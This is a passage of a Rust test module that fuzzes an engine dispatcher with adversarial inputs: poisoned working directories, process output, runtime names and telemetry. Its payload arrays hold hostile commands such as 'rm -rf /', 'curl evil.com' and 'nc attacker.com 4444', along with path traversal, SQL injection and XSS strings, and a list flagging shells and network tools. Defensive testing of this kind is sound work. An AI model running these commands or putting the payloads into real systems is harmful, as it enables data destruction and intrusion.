                    // Verify no obvious command injection
                    assert!(
                        !work_dir_str.contains(";"),
                        "Attack {}: Working directory should not contain command separators",
                        attack_idx
                    );
                    assert!(
                        !work_dir_str.contains("&&"),
                        "Attack {}: Working directory should not contain command chaining",
                        attack_idx
                    );
                    assert!(
                        !work_dir_str.contains("||"),
                        "Attack {}: Working directory should not contain command alternation",
                        attack_idx
                    );
                    assert!(
                        !work_dir_str.contains("|"),
                        "Attack {}: Working directory should not contain pipes",
                        attack_idx
                    );

                    // Verify no environment variable expansion
                    assert!(
                        !work_dir_str.contains("$("),
                        "Attack {}: Working directory should not contain command substitution",
                        attack_idx
                    );
                    assert!(
                        !work_dir_str.contains("`"),
                        "Attack {}: Working directory should not contain backtick substitution",
                        attack_idx
                    );
                    assert!(
                        !work_dir_str.contains("${"),
                        "Attack {}: Working directory should not contain variable expansion",
                        attack_idx
                    );

                    // Test path resolution safety
                    if let Ok(canonical) = fallback_plan.working_dir.canonicalize() {
                        let canonical_str = canonical.to_string_lossy();

                        // Verify canonicalized path doesn't escape to sensitive directories
                        let sensitive_dirs = ["/etc", "/root", "/usr/bin", "/proc", "/dev", "/sys"];
                        for sensitive_dir in &sensitive_dirs {
                            assert!(
                                !canonical_str.starts_with(sensitive_dir)
                                    || malicious_dir.starts_with(sensitive_dir),
                                "Attack {}: Canonicalization should not escape to sensitive directory {}",
                                attack_idx,
                                sensitive_dir
                            );
                        }

                        // Verify reasonable path depth
                        let depth = canonical_str.matches('/').count();
                        assert!(
                            depth <= 20,
                            "Attack {}: Canonicalized path should not be excessively deep: {}",
                            attack_idx,
                            depth
                        );
                    }

                    // Test report generation with malicious working directory
                    let report_inputs = DispatchReportInputs {
                        runtime: "test_runtime",
                        runtime_path: Path::new("/test/runtime"),
                        target: &temp_target,
                        working_dir: &fallback_plan.working_dir,
                        used_fallback_runtime: true,
                        started_at: chrono::Utc::now(),
                        duration: std::time::Duration::from_millis(100),
                        output: Output {
                            status: std::process::ExitStatus::from_raw(0),
                            stdout: Vec::new(),
                            stderr: Vec::new(),
                        },
                        telemetry: None,
                    };

                    // Verify report field sanitization
                    let working_dir_str = report_inputs.working_dir.to_string_lossy();
                    assert!(
                        !working_dir_str.contains('\0'),
                        "Attack {}: Report working directory should not contain null bytes",
                        attack_idx
                    );

                    // Test length limits
                    assert!(
                        working_dir_str.len() <= 10000,
                        "Attack {}: Working directory should have reasonable length limit",
                        attack_idx
                    );

                    Ok(())
                },
            ));

            match manipulation_result {
                Ok(_) => {
                    // Test completed successfully
                }
                Err(_) => {
                    println!(
                        "Working directory attack {} caused panic (safely caught)",
                        attack_idx
                    );
                }
            }

            // Test working directory creation safety (if attempted)
            if !malicious_dir.contains('\0') && malicious_dir.len() < 1000 {
                let creation_result =
                    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                        let test_dir =
                            std::env::temp_dir().join(format!("test_workdir_{}", attack_idx));

                        // Attempt to create a test directory (safely)
                        if let Ok(_) = std::fs::create_dir_all(&test_dir) {
                            // Verify created directory is within expected bounds
                            if let Ok(canonical) = test_dir.canonicalize() {
                                let temp_canonical = std::env::temp_dir()
                                    .canonicalize()
                                    .unwrap_or_else(|_| std::env::temp_dir());
                                assert!(
                                    canonical.starts_with(&temp_canonical),
                                    "Attack {}: Created directory should remain within temp bounds",
                                    attack_idx
                                );
                            }

                            // Clean up
                            std::fs::remove_dir_all(&test_dir).ok();
                        }
                    }));

                if creation_result.is_err() {
                    println!(
                        "Working directory creation attack {} caused panic (safely caught)",
                        attack_idx
                    );
                }
            }
        }

        println!(
            "Working directory manipulation test completed: {} attack vectors tested",
            malicious_work_dirs.len()
        );
    }

    #[test]
    fn test_extreme_adversarial_process_output_injection_attack() {
        // Test process output injection attacks where attacker manipulates captured
        // stdout/stderr to inject malicious content or cause parsing errors

        // Malicious process output injection patterns
        let malicious_outputs = [
            // Control character injection
            (
                b"normal output\x00null injection".to_vec(),
                b"error\x00injection".to_vec(),
                "Null byte injection",
            ),
            (
                b"output\x1B[31mRED\x1B[0m".to_vec(),
                b"error\x1B[32mGREEN".to_vec(),
                "ANSI escape injection",
            ),
            (
                b"output\r\nCRLF injection\r\n".to_vec(),
                b"error\r\ninjection".to_vec(),
                "CRLF injection",
            ),
            (
                b"output\x08\x09\x0A\x0B\x0C\x0D".to_vec(),
                b"error\x7F".to_vec(),
                "Control character flood",
            ),
            // Unicode attacks
            (
                b"output\xE2\x80\x8E\xE2\x80\x8F".to_vec(),
                b"error\xEF\xBB\xBF".to_vec(),
                "Unicode direction marks",
            ),
            (
                "output\u{202E}reversed\u{202D}".as_bytes().to_vec(),
                "error\u{200B}hidden".as_bytes().to_vec(),
                "Bidirectional override",
            ),
            (
                "output\u{FEFF}BOM".as_bytes().to_vec(),
                "error\u{034F}combining".as_bytes().to_vec(),
                "Unicode special characters",
            ),
            // JSON injection
            (
                b"output\",\"injected\":\"evil\"".to_vec(),
                b"error\"}],\"evil\":[{\"".to_vec(),
                "JSON structure injection",
            ),
            (
                b"output\\\"escaped\\\"".to_vec(),
                b"error\\n\\r\\t".to_vec(),
                "JSON escape injection",
            ),
            // Command injection patterns
            (
                b"output; rm -rf /".to_vec(),
                b"error && curl evil.com".to_vec(),
                "Command injection",
            ),
            (
                b"output $(whoami)".to_vec(),
                b"error `id`".to_vec(),
                "Command substitution",
            ),
            (
                b"output ${PATH}".to_vec(),
                b"error $HOME".to_vec(),
                "Environment variable injection",
            ),
            // XML/HTML injection
            (
                b"output<script>alert('xss')</script>".to_vec(),
                b"error</tag><evil>".to_vec(),
                "XML/HTML injection",
            ),
            (
                b"output<!--malicious-->".to_vec(),
                b"error<!DOCTYPE evil>".to_vec(),
                "XML declaration injection",
            ),
            // Format string injection
            (
                b"output %n%s%x%d".to_vec(),
                b"error %p%c%f".to_vec(),
                "Format string injection",
            ),
            // SQL injection patterns
            (
                b"output'; DROP TABLE logs; --".to_vec(),
                b"error' OR '1'='1".to_vec(),
                "SQL injection",
            ),
            // Buffer overflow simulation
            (
                vec![b'A'; 100000],
                vec![b'B'; 100000],
                "Buffer overflow simulation",
            ),
            (
                vec![0xFF; 50000],
                vec![0x00; 50000],
                "Binary data injection",
            ),
            // Newline injection
            (
                b"output\ninjected line\n".to_vec(),
                b"error\nfake error\n".to_vec(),
                "Newline injection",
            ),
            // Path injection
            (
                b"output ../../../etc/passwd".to_vec(),
                b"error /proc/self/environ".to_vec(),
                "Path injection",
            ),
            // Network injection
            (
                b"output http://evil.com/payload".to_vec(),
                b"error ftp://attacker.com".to_vec(),
                "Network URL injection",
            ),
            // Encoding attacks
            (
                b"output\x80\x81\x82".to_vec(),
                b"error\xFE\xFF".to_vec(),
                "Invalid UTF-8 injection",
            ),
        ];

        for (attack_idx, (malicious_stdout, malicious_stderr, attack_description)) in
            malicious_outputs.iter().enumerate()
        {
            println!(
                "Testing process output injection attack {}: {}",
                attack_idx, attack_description
            );

            let injection_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                // Create mock process output with malicious content
                let mock_output = Output {
                    status: std::process::ExitStatus::from_raw(0),
                    stdout: malicious_stdout.clone(),
                    stderr: malicious_stderr.clone(),
                };

                // Test captured output processing
                let captured = CapturedProcessOutput {
                    stdout: String::from_utf8_lossy(&mock_output.stdout).to_string(),
                    stderr: String::from_utf8_lossy(&mock_output.stderr).to_string(),
                };

                // Verify output sanitization
                assert!(
                    !captured.stdout.contains('\0') || captured.stdout.len() == 0,
                    "Attack {}: Stdout should handle null bytes safely",
                    attack_idx
                );
                assert!(
                    !captured.stderr.contains('\0') || captured.stderr.len() == 0,
                    "Attack {}: Stderr should handle null bytes safely",
                    attack_idx
                );

                // Verify length limits
                assert!(
                    captured.stdout.len() <= 1000000,
                    "Attack {}: Stdout should have reasonable length limit: {}",
                    attack_idx,
                    captured.stdout.len()
                );
                assert!(
                    captured.stderr.len() <= 1000000,
                    "Attack {}: Stderr should have reasonable length limit: {}",
                    attack_idx,
                    captured.stderr.len()
                );

                // Test JSON serialization safety
                let serialize_result = serde_json::to_string(&captured);
                match serialize_result {
                    Ok(json) => {
                        // Verify no injection in serialized JSON
                        assert!(
                            !json.contains("\"injected\":"),
                            "Attack {}: JSON should not contain injected fields",
                            attack_idx
                        );
                        assert!(
                            !json.contains("\"evil\":"),
                            "Attack {}: JSON should not contain evil payloads",
                            attack_idx
                        );

                        // Verify JSON can be parsed back
                        let parse_back_result: Result<CapturedProcessOutput, _> =
                            serde_json::from_str(&json);
                        assert!(
                            parse_back_result.is_ok(),
                            "Attack {}: Serialized JSON should parse back correctly",
                            attack_idx
                        );
                    }
                    Err(e) => {
                        // Serialization failure is acceptable for malformed data
                        println!("Attack {}: Serialization failed safely: {}", attack_idx, e);
                        let error_msg = e.to_string();
                        assert!(
                            !error_msg.contains('\0'),
                            "Attack {}: Error should not contain null bytes",
                            attack_idx
                        );
                    }
                }

                // Test report generation with malicious output
                let report_inputs = DispatchReportInputs {
                    runtime: "test_runtime",
                    runtime_path: Path::new("/test/runtime"),
                    target: Path::new("/test/target"),
                    working_dir: Path::new("/test/workdir"),
                    used_fallback_runtime: false,
                    started_at: chrono::Utc::now(),
                    duration: std::time::Duration::from_millis(100),
                    output: mock_output,
                    telemetry: None,
                };

                // Build report with malicious output
                let report = RunDispatchReport {
                    runtime: report_inputs.runtime.to_string(),
                    runtime_path: report_inputs.runtime_path.to_string_lossy().to_string(),
                    target: report_inputs.target.to_string_lossy().to_string(),
                    working_dir: report_inputs.working_dir.to_string_lossy().to_string(),
                    used_fallback_runtime: report_inputs.used_fallback_runtime,
                    started_at_utc: report_inputs.started_at.to_rfc3339(),
                    finished_at_utc: (report_inputs.started_at
                        + chrono::Duration::from_std(report_inputs.duration).unwrap())
                    .to_rfc3339(),
                    duration_ms: report_inputs.duration.as_millis() as u64,
                    exit_code: report_inputs.output.status.code(),
                    terminated_by_signal: !report_inputs.output.status.success(),
                    telemetry: report_inputs.telemetry.clone(),
                    captured_output: captured,
                };

                // Test report serialization safety
                let report_serialize_result = serde_json::to_string(&report);
                match report_serialize_result {
                    Ok(report_json) => {
                        // Verify report JSON integrity
                        assert!(
                            !report_json.contains("\"injected\":"),
                            "Attack {}: Report JSON should not contain injected fields",
                            attack_idx
                        );
                        assert!(
                            !report_json.contains("rm -rf"),
                            "Attack {}: Report JSON should not contain command injection",
                            attack_idx
                        );

                        // Test report deserialization
                        let report_parse_result: Result<RunDispatchReport, _> =
                            serde_json::from_str(&report_json);
                        assert!(
                            report_parse_result.is_ok(),
                            "Attack {}: Report JSON should parse back correctly",
                            attack_idx
                        );

                        if let Ok(parsed_report) = report_parse_result {
                            // Verify parsed report integrity
                            assert!(
                                !parsed_report.captured_output.stdout.is_empty()
                                    || malicious_stdout.is_empty(),
                                "Attack {}: Parsed stdout should preserve content (unless empty)",
                                attack_idx
                            );
                            assert!(
                                !parsed_report.captured_output.stderr.is_empty()
                                    || malicious_stderr.is_empty(),
                                "Attack {}: Parsed stderr should preserve content (unless empty)",
                                attack_idx
                            );
                        }
                    }
                    Err(e) => {
                        println!(
                            "Attack {}: Report serialization failed safely: {}",
                            attack_idx, e
                        );
                    }
                }

                Ok(())
            }));

            match injection_result {
                Ok(_) => {
                    // Test completed successfully
                }
                Err(_) => {
                    println!(
                        "Process output attack {} caused panic (safely caught)",
                        attack_idx
                    );
                }
            }

            // Test output truncation for extremely large outputs
            if malicious_stdout.len() > 50000 || malicious_stderr.len() > 50000 {
                let truncation_test =
                    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                        let truncated_stdout = if malicious_stdout.len() > 10000 {
                            String::from_utf8_lossy(&malicious_stdout[..10000]).to_string()
                        } else {
                            String::from_utf8_lossy(malicious_stdout).to_string()
                        };

                        let truncated_stderr = if malicious_stderr.len() > 10000 {
                            String::from_utf8_lossy(&malicious_stderr[..10000]).to_string()
                        } else {
                            String::from_utf8_lossy(malicious_stderr).to_string()
                        };

                        let truncated_output = CapturedProcessOutput {
                            stdout: truncated_stdout,
                            stderr: truncated_stderr,
                        };

                        // Verify truncated output is manageable
                        assert!(
                            truncated_output.stdout.len() <= 10000,
                            "Attack {}: Truncated stdout should be within limits",
                            attack_idx
                        );
                        assert!(
                            truncated_output.stderr.len() <= 10000,
                            "Attack {}: Truncated stderr should be within limits",
                            attack_idx
                        );

                        // Test serialization of truncated output
                        let truncated_json = serde_json::to_string(&truncated_output);
                        assert!(
                            truncated_json.is_ok(),
                            "Attack {}: Truncated output should serialize successfully",
                            attack_idx
                        );
                    }));

                if truncation_test.is_err() {
                    println!(
                        "Output truncation test {} caused panic (safely caught)",
                        attack_idx
                    );
                }
            }
        }

        println!(
            "Process output injection test completed: {} attack vectors tested",
            malicious_outputs.len()
        );
    }

    #[test]
    fn test_extreme_adversarial_runtime_fallback_confusion_attack() {
        // Test runtime fallback confusion attacks where attacker manipulates runtime
        // selection to force execution of malicious runtimes or bypass security controls

        let dispatcher = EngineDispatcher::new(
            "nonexistent_engine".to_string(),
            None,
            PreferredRuntime::FrankenEngine,
        );

        // Malicious runtime confusion patterns
        let runtime_confusion_attacks = [
            // Runtime path manipulation
            ("/bin/sh", "Shell execution via runtime path"),
            ("/usr/bin/curl", "Network tool execution"),
            ("/usr/bin/wget", "Download tool execution"),
            ("/bin/cat", "File reading via cat"),
            ("/usr/bin/nc", "Network communication tool"),
            ("/usr/bin/python3", "Interpreter execution"),
            ("/usr/bin/perl", "Script interpreter execution"),
            ("/bin/bash", "Shell interpreter execution"),
            // Command injection in runtime names
            ("node; rm -rf /", "Command injection in runtime name"),
            ("python && curl evil.com", "Command chaining in runtime"),
            ("ruby || /bin/sh", "Command alternation in runtime"),
            ("deno | nc attacker.com 4444", "Pipe injection in runtime"),
            ("bun $(whoami)", "Command substitution in runtime"),
            ("node `id`", "Backtick substitution in runtime"),
            ("npm ${PATH}", "Environment variable injection"),
            // Path traversal in runtime resolution
            ("../../../bin/sh", "Path traversal to shell"),
            ("../../../../usr/bin/curl", "Deep path traversal"),
            (
                "../../usr/local/bin/malicious",
                "Relative path manipulation",
            ),
            ("./../../../../bin/bash", "Current directory traversal"),
            // Symbolic link exploitation
            ("/tmp/evil_symlink", "Symbolic link to malicious binary"),
            ("/var/tmp/../../../bin/sh", "Symlink traversal"),
            ("/proc/self/exe", "Process self-execution"),
            // Device file exploitation
            ("/dev/null", "Null device exploitation"),
            ("/dev/zero", "Zero device exploitation"),
            ("/dev/random", "Random device exploitation"),
            ("/dev/stdin", "Stdin device exploitation"),
            // Network-based runtime confusion
            ("http://evil.com/runtime", "HTTP-based runtime"),
            ("ftp://attacker.com/malicious", "FTP-based runtime"),
            ("//evil.com/shared/runtime", "UNC path runtime"),
            // Control character confusion
            ("node\x00/bin/sh", "Null byte runtime confusion"),
            ("python\r\necho hacked", "CRLF runtime injection"),
            ("ruby\x1B[31mcolored", "ANSI escape runtime"),
            // Unicode runtime confusion
            ("node\u{202E}edoN", "Bidirectional override runtime"),
            ("python\u{200B}hidden", "Zero-width space runtime"),
            ("ruby\u{FEFF}bom", "BOM runtime confusion"),
            // Environment variable runtime confusion
            ("${SHELL}", "Shell environment variable"),
            ("$HOME/malicious", "Home directory runtime"),
            ("$(echo /bin/sh)", "Command substitution runtime"),
        ];

        for (attack_idx, (malicious_runtime, attack_description)) in
            runtime_confusion_attacks.iter().enumerate()
        {
            println!(
                "Testing runtime confusion attack {}: {}",
                attack_idx, attack_description
            );

            let confusion_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                // Create malicious config with confused runtime
                let config = Config {
                    preferred_runtime: PreferredRuntime::NodeJs,
                    engine_path: None,
                    ..Default::default()
                };

                let malicious_runtime_path = PathBuf::from(malicious_runtime);

                // Test runtime fallback plan creation with malicious runtime
                let fallback_plan = RuntimeFallbackPlan {
                    runtime: malicious_runtime.to_string(),
                    runtime_path: malicious_runtime_path.clone(),
                    target: PathBuf::from("/test/target"),
                    working_dir: PathBuf::from("/test/workdir"),
                    mode: RuntimeExecutionMode::FallbackFrankenEngineUnavailable,
                };

                // Verify runtime path sanitization
                let runtime_str = fallback_plan.runtime_path.to_string_lossy();
                assert!(
                    !runtime_str.contains('\0'),
                    "Attack {}: Runtime path should not contain null bytes",
                    attack_idx
                );

                // Verify no obvious command injection
                assert!(
                    !fallback_plan.runtime.contains(';'),
                    "Attack {}: Runtime name should not contain command separators",
                    attack_idx
                );
                assert!(
                    !fallback_plan.runtime.contains('&'),
                    "Attack {}: Runtime name should not contain command chaining",
                    attack_idx
                );
                assert!(
                    !fallback_plan.runtime.contains('|'),
                    "Attack {}: Runtime name should not contain pipes",
                    attack_idx
                );

                // Verify no command substitution
                assert!(
                    !fallback_plan.runtime.contains("$("),
                    "Attack {}: Runtime name should not contain command substitution",
                    attack_idx
                );
                assert!(
                    !fallback_plan.runtime.contains("`"),
                    "Attack {}: Runtime name should not contain backtick substitution",
                    attack_idx
                );
                assert!(
                    !fallback_plan.runtime.contains("${"),
                    "Attack {}: Runtime name should not contain variable expansion",
                    attack_idx
                );

                // Test runtime resolution with confusion
                let resolution_result = dispatcher.resolve_runtime_internal(
                    &config,
                    Some(malicious_runtime), // env_override with malicious runtime
                    None,                    // cli_path
                );

                match resolution_result {
                    Ok(plan) => {
                        match plan {
                            DispatchPlan::FrankenEngine { ref binary } => {
                                // If FrankenEngine plan, verify binary safety
                                assert!(
                                    !binary.contains(';'),
                                    "Attack {}: Engine binary should not contain command injection",
                                    attack_idx
                                );
                                assert!(
                                    !binary.contains('\0'),
                                    "Attack {}: Engine binary should not contain null bytes",
                                    attack_idx
                                );
                            }
                            DispatchPlan::RuntimeFallback(ref plan) => {
                                // Verify fallback plan safety
                                assert!(
                                    !plan.runtime.contains(';'),
                                    "Attack {}: Fallback runtime should not contain command injection",
                                    attack_idx
                                );
                                assert!(
                                    !plan.runtime.contains('\0'),
                                    "Attack {}: Fallback runtime should not contain null bytes",
                                    attack_idx
                                );

                                // Verify runtime path doesn't escape to dangerous locations
                                let runtime_path_str = plan.runtime_path.to_string_lossy();
                                let dangerous_paths =
                                    ["/bin/sh", "/bin/bash", "/usr/bin/curl", "/usr/bin/wget"];
                                for dangerous_path in &dangerous_paths {
                                    if runtime_path_str == *dangerous_path {
                                        println!(
                                            "WARNING: Attack {}: Dangerous runtime path detected: {}",
                                            attack_idx, dangerous_path
                                        );
                                    }
                                }

                                // Verify execution mode is appropriate
                                match plan.mode {
                                    RuntimeExecutionMode::FallbackFrankenEngineUnavailable => {
                                        // This is expected for fallback scenarios
                                    }
                                    RuntimeExecutionMode::Explicit => {
                                        // Explicit execution should be carefully validated
                                        assert!(
                                            !runtime_path_str.contains("../"),
                                            "Attack {}: Explicit runtime should not contain path traversal",
                                            attack_idx
                                        );
                                    }
                                }
                            }
                        }
                    }
                    Err(e) => {
                        // Expected behavior for many malicious runtimes
                        let error_msg = e.to_string();
                        assert!(
                            !error_msg.contains('\0'),
                            "Attack {}: Error message should not contain null bytes",
                            attack_idx
                        );
                        assert!(
                            !error_msg.contains(';'),
                            "Attack {}: Error message should not contain command injection",
                            attack_idx
                        );
                    }
                }

                // Test dispatch plan comparison and validation
                let legitimate_plan = DispatchPlan::FrankenEngine {
                    binary: "legitimate_engine".to_string(),
                };

                let malicious_plan = DispatchPlan::RuntimeFallback(fallback_plan.clone());

                // Plans should not be equal if they're different
                assert_ne!(
                    legitimate_plan, malicious_plan,
                    "Attack {}: Different plans should not be equal",
                    attack_idx
                );

                // Test plan debugging output safety
                let plan_debug = format!("{:?}", malicious_plan);
                assert!(
                    !plan_debug.contains('\0'),
                    "Attack {}: Plan debug output should not contain null bytes",
                    attack_idx
                );
                assert!(
                    !plan_debug.contains("; rm"),
                    "Attack {}: Plan debug output should not contain obvious command injection",
                    attack_idx
                );

                Ok(())
            }));

            match confusion_result {
                Ok(_) => {
                    // Test completed successfully
                }
                Err(_) => {
                    println!(
                        "Runtime confusion attack {} caused panic (safely caught)",
                        attack_idx
                    );
                }
            }

            // Test environment override confusion
            let env_override_test = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                let config = Config {
                    preferred_runtime: PreferredRuntime::NodeJs,
                    engine_path: None,
                    ..Default::default()
                };

                // Test with malicious environment override
                let env_override_result =
                    dispatcher.resolve_runtime_internal(&config, Some(malicious_runtime), None);

                // Environment overrides should be handled safely
                match env_override_result {
                    Ok(plan) => {
                        // Verify plan safety regardless of source
                        let plan_debug = format!("{:?}", plan);
                        assert!(
                            !plan_debug.contains('\0'),
                            "Attack {}: Environment override plan should be safe",
                            attack_idx
                        );
                    }
                    Err(_) => {
                        // Rejection is acceptable for malicious overrides
                    }
                }
            }));

            if env_override_test.is_err() {
                println!(
                    "Environment override test {} caused panic (safely caught)",
                    attack_idx
                );
            }
        }

        println!(
            "Runtime fallback confusion test completed: {} attack vectors tested",
            runtime_confusion_attacks.len()
        );
    }

    #[test]
    fn test_extreme_adversarial_telemetry_data_poisoning_attack() {
        // Test telemetry data poisoning attacks where attacker manipulates telemetry
        // reports to inject malicious data, cause parsing errors, or leak information

        // Create mock telemetry bridge for testing
        let telemetry_bridge = TelemetryBridge::new("test_bridge".to_string());
        let (tx, rx) = std::sync::mpsc::channel();

        // Malicious telemetry poisoning patterns
        let telemetry_poison_attacks = [
            // JSON injection in telemetry fields
            ("telemetry\",\"injected\":\"evil", "JSON field injection"),
            ("telemetry}],\"malicious\":[{", "JSON structure injection"),
            ("telemetry\\\"escaped\\\"", "JSON escape injection"),
            // Command injection in telemetry
            ("telemetry; rm -rf /", "Command injection in telemetry"),
            (
                "telemetry && curl evil.com",
                "Command chaining in telemetry",
            ),
            ("telemetry $(whoami)", "Command substitution in telemetry"),
            ("telemetry `id`", "Backtick substitution in telemetry"),
            ("telemetry ${PATH}", "Environment variable in telemetry"),
            // Control character injection
            ("telemetry\x00null", "Null byte in telemetry"),
            ("telemetry\r\nCRLF", "CRLF injection in telemetry"),
            ("telemetry\x1B[31mcolored", "ANSI escape in telemetry"),
            ("telemetry\x08\x09\x0A", "Control characters in telemetry"),
            // Unicode attacks in telemetry
            (
                "telemetry\u{202E}reversed",
                "Bidirectional override in telemetry",
            ),
            ("telemetry\u{200B}hidden", "Zero-width space in telemetry"),
            ("telemetry\u{FEFF}bom", "BOM injection in telemetry"),
            // Path injection in telemetry
            (
                "telemetry ../../../etc/passwd",
                "Path traversal in telemetry",
            ),
            ("telemetry /proc/self/environ", "Process info in telemetry"),
            // SQL injection in telemetry
            (
                "telemetry'; DROP TABLE events; --",
                "SQL injection in telemetry",
            ),
            ("telemetry' OR '1'='1", "SQL condition injection"),
            // XML injection in telemetry
            (
                "telemetry<script>alert('xss')</script>",
                "XSS injection in telemetry",
            ),
            ("telemetry<!--malicious-->", "XML comment injection"),
            // Format string injection
            ("telemetry %n%s%x%d", "Format string in telemetry"),
            // Buffer overflow simulation
            ("A".repeat(100000), "Large telemetry payload"),
            // Network injection
            ("telemetry http://evil.com", "HTTP URL in telemetry"),
            ("telemetry ftp://attacker.com", "FTP URL in telemetry"),
        ];

        for (attack_idx, (malicious_data, attack_description)) in
            telemetry_poison_attacks.iter().enumerate()
        {
            println!(
                "Testing telemetry poisoning attack {}: {}",
                attack_idx, attack_description
            );

            let poisoning_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                // Create malicious telemetry runtime handle
                let runtime_handle = TelemetryRuntimeHandle {
                    shutdown_signal: tx.clone(),
                };

                // Create malicious telemetry report
                let malicious_report = TelemetryRuntimeReport {
                    runtime_id: malicious_data.clone(),
                    started_at: chrono::Utc::now().to_rfc3339(),
                    shutdown_reason: ShutdownReason::Requested,
                    shutdown_started_at: Some(chrono::Utc::now().to_rfc3339()),
                    shutdown_completed_at: Some(chrono::Utc::now().to_rfc3339()),
                    drain_timeout_secs: 30,
                    events_emitted: 42,
                    recent_events: vec![],
                };

                // Test report field sanitization
                assert!(
                    !malicious_report.runtime_id.contains('\0')
                        || malicious_report.runtime_id.is_empty(),
                    "Attack {}: Runtime ID should handle null bytes safely",
                    attack_idx
                );

                // Verify length limits
                assert!(
                    malicious_report.runtime_id.len() <= 1000000,
                    "Attack {}: Runtime ID should have reasonable length limit",
                    attack_idx
                );

                // Test JSON serialization of poisoned telemetry
                let serialize_result = serde_json::to_string(&malicious_report);
                match serialize_result {
                    Ok(json) => {
                        // Verify no injection in serialized JSON
                        assert!(
                            !json.contains("\"injected\":"),
                            "Attack {}: Telemetry JSON should not contain injected fields",
                            attack_idx
                        );
                        assert!(
                            !json.contains("\"malicious\":"),
                            "Attack {}: Telemetry JSON should not contain malicious fields",
                            attack_idx
                        );
                        assert!(
                            !json.contains("rm -rf"),
                            "Attack {}: Telemetry JSON should not contain command injection",
                            attack_idx
                        );

                        // Test JSON parsing back
                        let parse_result: Result<TelemetryRuntimeReport, _> =
                            serde_json::from_str(&json);
                        assert!(
                            parse_result.is_ok(),
                            "Attack {}: Poisoned telemetry JSON should parse back",
                            attack_idx
                        );

                        if let Ok(parsed_report) = parse_result {
                            // Verify parsed report integrity
                            assert!(
                                !parsed_report.runtime_id.is_empty() || malicious_data.is_empty(),
                                "Attack {}: Parsed runtime ID should preserve content",
                                attack_idx
                            );

                            // Verify no command execution contexts
                            assert!(
                                !parsed_report.runtime_id.contains(";"),
                                "Attack {}: Parsed runtime ID should not contain command separators",
                                attack_idx
                            );
                        }
                    }
                    Err(e) => {
                        println!(
                            "Attack {}: Telemetry serialization failed safely: {}",
                            attack_idx, e
                        );
                        let error_msg = e.to_string();
                        assert!(
                            !error_msg.contains('\0'),
                            "Attack {}: Telemetry error should not contain null bytes",
                            attack_idx
                        );
                    }
                }

                // Test telemetry in dispatch report
                let temp_target = std::env::temp_dir().join("telemetry_test");
                std::fs::write(&temp_target, "test content").ok();

                let report_with_telemetry = RunDispatchReport {
                    runtime: "test_runtime".to_string(),
                    runtime_path: "/test/runtime".to_string(),
                    target: temp_target.to_string_lossy().to_string(),
                    working_dir: "/test/workdir".to_string(),
                    used_fallback_runtime: false,
                    started_at_utc: chrono::Utc::now().to_rfc3339(),
                    finished_at_utc: chrono::Utc::now().to_rfc3339(),
                    duration_ms: 100,
                    exit_code: Some(0),
                    terminated_by_signal: false,
                    telemetry: Some(malicious_report),
                    captured_output: CapturedProcessOutput {
                        stdout: "test stdout".to_string(),
                        stderr: "test stderr".to_string(),
                    },
                };

                // Test dispatch report serialization with poisoned telemetry
                let report_serialize_result = serde_json::to_string(&report_with_telemetry);
                match report_serialize_result {
                    Ok(report_json) => {
                        // Verify dispatch report JSON safety
                        assert!(
                            !report_json.contains("\"injected\":"),
                            "Attack {}: Dispatch report should not contain injected fields",
                            attack_idx
                        );
                        assert!(
                            !report_json.contains("rm -rf"),
                            "Attack {}: Dispatch report should not contain command injection",
                            attack_idx
                        );

                        // Test dispatch report parsing
                        let report_parse_result: Result<RunDispatchReport, _> =
                            serde_json::from_str(&report_json);
                        assert!(
                            report_parse_result.is_ok(),
                            "Attack {}: Dispatch report should parse back correctly",
                            attack_idx
                        );
                    }
                    Err(e) => {
                        println!(
                            "Attack {}: Dispatch report serialization failed safely: {}",
                            attack_idx, e
                        );
                    }
                }

                // Test telemetry handle shutdown with poisoned data
                let shutdown_result = runtime_handle
                    .shutdown_signal
                    .send(ShutdownReason::Requested);
                match shutdown_result {
                    Ok(()) => {
                        // Shutdown signal sent successfully
                    }
                    Err(e) => {
                        println!(
                            "Attack {}: Telemetry shutdown failed safely: {}",
                            attack_idx, e
                        );
                    }
                }

                // Test telemetry bridge handling of poisoned data
                let bridge_test_result =
                    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                        // Test telemetry bridge with malicious data (if it has public methods)
                        let bridge_debug = format!("{:?}", telemetry_bridge);
                        assert!(
                            !bridge_debug.contains('\0'),
                            "Attack {}: Telemetry bridge debug should be safe",
                            attack_idx
                        );
                    }));

                if bridge_test_result.is_err() {
                    println!(
                        "Telemetry bridge test {} caused panic (safely caught)",
                        attack_idx
                    );
                }

                Ok(())
            }));

            match poisoning_result {
                Ok(_) => {
                    // Test completed successfully
                }
                Err(_) => {
                    println!(
                        "Telemetry poisoning attack {} caused panic (safely caught)",
                        attack_idx
                    );
                }
            }

            // Test telemetry event injection
            if malicious_data.len() < 1000 {
                let event_injection_test =
                    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                        use crate::ops::telemetry_bridge::TelemetryEvent;

                        let malicious_event = TelemetryEvent {
                            code: malicious_data.clone(),
                            timestamp: chrono::Utc::now().to_rfc3339(),
                            reason_code: Some(malicious_data.clone()),
                            details: Some(format!("details_{}", malicious_data)),
                        };

                        // Test event serialization
                        let event_json = serde_json::to_string(&malicious_event);
                        match event_json {
                            Ok(json) => {
                                assert!(
                                    !json.contains("\"injected\":"),
                                    "Attack {}: Event JSON should not contain injected fields",
                                    attack_idx
                                );

                                let event_parse: Result<TelemetryEvent, _> =
                                    serde_json::from_str(&json);
                                assert!(
                                    event_parse.is_ok(),
                                    "Attack {}: Event JSON should parse back",
                                    attack_idx
                                );
                            }
                            Err(e) => {
                                println!(
                                    "Attack {}: Event serialization failed safely: {}",
                                    attack_idx, e
                                );
                            }
                        }
                    }));

                if event_injection_test.is_err() {
                    println!(
                        "Telemetry event injection test {} caused panic (safely caught)",
                        attack_idx
                    );
                }
            }
        }

        println!(
            "Telemetry data poisoning test completed: {} attack vectors tested",
            telemetry_poison_attacks.len()
        );
    }

    #[test]
    fn test_extreme_adversarial_concurrent_dispatcher_race_exploitation() {
        // Test concurrent dispatcher race exploitation where multiple threads attempt
        // to exploit race conditions in engine dispatch and process management

        use std::sync::{Arc, Mutex};
        use std::thread;

        // Shared dispatcher for concurrent access
